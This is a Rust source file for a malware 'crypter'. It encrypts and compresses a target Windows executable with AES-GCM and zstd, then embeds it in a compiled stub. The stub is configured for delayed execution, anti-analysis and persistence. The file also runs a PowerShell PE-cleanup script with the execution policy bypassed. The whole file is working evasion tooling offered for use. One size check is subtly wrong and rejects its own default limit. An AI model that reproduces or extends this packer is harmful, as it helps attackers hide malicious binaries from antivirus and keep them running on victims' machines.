use std::path::{Path, PathBuf};
use std::process::Command;
use aes_gcm::{Aes256Gcm, Key, Nonce, aead::{Aead, KeyInit, OsRng}};
use aes_gcm::aead::rand_core::RngCore;
mod parser;
mod pkg;

struct Crypter {
    target_binary: PathBuf,
    output: PathBuf,
    delay: u64,
    anti_analysis: bool,
    persistence: bool,
    payload: Option<Vec<u8>>,
    key: Option<[u8; 32]>,
    nonce: Option<[u8; 12]>,
}

impl Crypter {
    fn new(
        target_binary: PathBuf,
        output: PathBuf,
        delay: u64,
        anti_analysis: bool,
        persistence: bool,
    ) -> Crypter {
        Crypter {
            target_binary,
            output,
            delay,
            anti_analysis,
            persistence,
            payload: None,
            key: None,
            nonce: None,
        }
    }

    fn parse_args() -> Result<Crypter, String> {
        let args = parser::parser()?;
        let max_file_size_mb = pkg::get_env_u64("MAX_FILE_SIZE_MB", 350)?;
        let max_delay_seconds = pkg::get_env_u64("MAX_DELAY_SECONDS", 3000)?;

        if max_file_size_mb >= 350 {
            return Err("MAX_FILE_SIZE_MB cannot exceed 350 MB.".to_string());
        }

        if max_delay_seconds > 3000 {
            return Err("MAX_DELAY_SECONDS cannot exceed 3000 seconds.".to_string());
        }

        if args.delay > max_delay_seconds {
            return Err(format!("Delay exceeds the maximum allowed delay of {} seconds.", max_delay_seconds));
        }

        let target_binary = args.target_binary.ok_or("Target binary is required.")?;
        let metadata = std::fs::metadata(&target_binary).map_err(|e| format!("Failed to read target binary metadata: {}", e))?;
        let file_size_mb = metadata.len() / (1024 * 1024);
        
        if file_size_mb > max_file_size_mb {
            return Err(format!("Target binary size exceeds the maximum allowed size of {} MB.", max_file_size_mb));
        }

        pkg::validate_pe(&target_binary)?;

        let output = args.output.unwrap_or_else(|| {
            let mut output_path = target_binary.clone();
            let file_name = output_path.file_name().unwrap_or_default().to_string_lossy();
            output_path.set_file_name(format!("obfuscated_{}", file_name));
            output_path
        });
        // create the output file if it doesn't exist, or truncate it if it does
        std::fs::File::create(&output).map_err(|e| format!("Failed to create output file: {}", e))?;

        Ok(Crypter::new(
            target_binary, output, args.delay, args.anti_analysis, args.persistence
        ))
    }

    // encrypt the target PE using AES-GCM and store the ciphertext in self.payload.
    fn encrypt(&mut self) -> Result<(), String> {
        let plaintext = std::fs::read(&self.target_binary).map_err(|e| format!("read target failed: {}", e))?;
        let passphrase = std::env::var("ENCRYPTION_KEY").map_err(|_| "ENCRYPTION_KEY not set in .env".to_string())?;

        let mut nonce_bytes = [0u8; 12];
        OsRng.fill_bytes(&mut nonce_bytes);

        let key = pkg::derive_key(passphrase.as_bytes(), &nonce_bytes)?;
        let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&key));
        let ciphertext = cipher.encrypt(Nonce::from_slice(&nonce_bytes), plaintext.as_ref()).map_err(|e| format!("AES-GCM encrypt failed ({} bytes): {:?}", plaintext.len(), e))?;

        self.key = Some(key);
        self.nonce = Some(nonce_bytes);
        self.payload = Some(ciphertext);
        pkg::log_info("Target binary encrypted successfully.");
        Ok(())
    }

    fn cleanup(&self, stub_dir: &Path) -> Result<(), String> {
        std::fs::remove_file(stub_dir.join("payload.enc")).map_err(|e| format!("remove payload.enc: {}", e))?;
        std::fs::remove_file(stub_dir.join("src/generated.rs")).map_err(|e| format!("remove generated.rs: {}", e))?;
        pkg::log_info("Cleanup completed successfully.");
        Ok(())
    }

    fn compress(&mut self) -> Result<(), String> {
        let ciphertext = self.payload.take().ok_or("compress before encrypt")?;
        let compressed = zstd::encode_all(&ciphertext[..], 10).map_err(|e| format!("zstd compress failed: {}", e))?;
        self.payload = Some(compressed);
        pkg::log_info("Payload compressed successfully.");
        Ok(())
    }

    // Write compressed ciphertext to stub/payload.enc.
    fn write_payload(&self, stub_dir: &Path) -> Result<(), String> {
        let payload = self.payload.as_ref().ok_or("write_payload before compress")?;
        std::fs::write(stub_dir.join("payload.enc"), payload).map_err(|e| format!("write payload.enc: {}", e))?;
        pkg::log_info("Payload written successfully.");
        Ok(())
    }

    // Generate the configuration file for the stub.
    fn generate_config(&self, stub_dir: &Path) -> Result<(), String> {
        let key = self.key.ok_or("missing key")?;
        let nonce = self.nonce.ok_or("missing nonce")?;

        let src = format!(
            "// Auto-generated by crypter. Do not edit.\n\
             pub const KEY: [u8; 32] = {key:?};\n\
             pub const PERSISTENCE: bool = {persistence:?};\n\
             pub const NONCE: [u8; 12] = {nonce:?};\n\
             pub const DELAY_SECS: u64 = {delay};\n\
             pub const ANALYSIS_DETECTION: bool = {anti_analysis};\n",
            key = key,
            persistence = self.persistence,
            nonce = nonce,
            delay = self.delay,
            anti_analysis = self.anti_analysis,
        );

        std::fs::write(stub_dir.join("src/generated.rs"), src).map_err(|e| format!("write generated.rs: {}", e))?;
        pkg::log_info("Stub configuration generated successfully.");
        Ok(())
    }
}

// Compile the stub 
fn build_stub(stub_dir: &Path) -> Result<PathBuf, String> {
    // Dynamically retrieve the current user profile directory
    let user_profile = std::env::var("USERPROFILE").map_err(|_| "USERPROFILE environment variable not set".to_string())?;
    // Remap build paths so absolute user paths don't leak into the binary
    let remap = format!("--remap-path-prefix={}=/build", user_profile);

    let status = Command::new("cargo")
        .args(["build", "--release"])
        .env("RUSTFLAGS", &remap)
        .current_dir(stub_dir)
        .status()
        .map_err(|e| format!("spawn cargo: {}", e))?;

    if !status.success() {
        return Err("stub build failed".to_string());
    }

    // target/release/stub.exe (relative to the stub crate)
    let stub_exe = stub_dir.join("target").join("release").join("stub.exe");
    if !stub_exe.exists() {
        return Err(format!("built stub not found: {}", stub_exe.display()));
    }

    pkg::log_info("Stub built successfully.");
    Ok(stub_exe)
}

fn cleanup_output(output_exe: &Path, stub_dir: &Path) -> Result<(), String> {
    let root = stub_dir.parent().and_then(|p| p.parent()).ok_or_else(|| format!("cannot resolve grandparent of: {}", stub_dir.display()))?;
    let script = root.join("scripts").join("cleanup_pe.ps1");

    if !script.exists() {
        return Err(format!("cleanup script not found: {}", script.display()));
    }

    if !output_exe.exists() {
        return Err(format!("output exe not found: {}", output_exe.display()));
    }

    let output = Command::new("powershell")
        .args([
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-File", script.to_str().ok_or("non-UTF8 script path")?,
            "-Path", output_exe.to_str().ok_or("non-UTF8 exe path")?,
        ])
        .output()
        .map_err(|e| format!("spawn powershell: {e}"))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(format!("PE cleanup failed: {stderr}"));
    }
    for line in String::from_utf8_lossy(&output.stdout).lines() {
        pkg::log_info(line);
    }

    pkg::log_info("PE cleanup applied to output binary.");
    Ok(())
}

fn run(crypter: &mut Crypter, stub_dir: &Path) -> Result<(), String> {
    crypter.encrypt()?;
    crypter.compress()?;
    crypter.write_payload(stub_dir)?;
    crypter.generate_config(stub_dir)?;

    let built = build_stub(stub_dir)?;

    std::fs::copy(&built, &crypter.output).map_err(|e| format!("copy output failed: {}", e))?;
    pkg::log_info(&format!("Stub copied to {}", crypter.output.display()));
    cleanup_output(&crypter.output, stub_dir)?;
    crypter.cleanup(stub_dir)?;
    Ok(())
}

fn main() {
    dotenvy::dotenv().ok();
    let mut crypter = match Crypter::parse_args() {
        Ok(c) => c,
        Err(err) => {
            pkg::log_error(&format!("{}", err));
            std::process::exit(1);
        }
    };

    let stub_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).parent().unwrap().join("stub");
    if let Err(err) = run(&mut crypter, &stub_dir) {
        pkg::log_error(&format!("{}", err));
        std::process::exit(1);
    }

    pkg::log_ok(&format!("Binary saved as \"{}\".", crypter.output.display()));
}
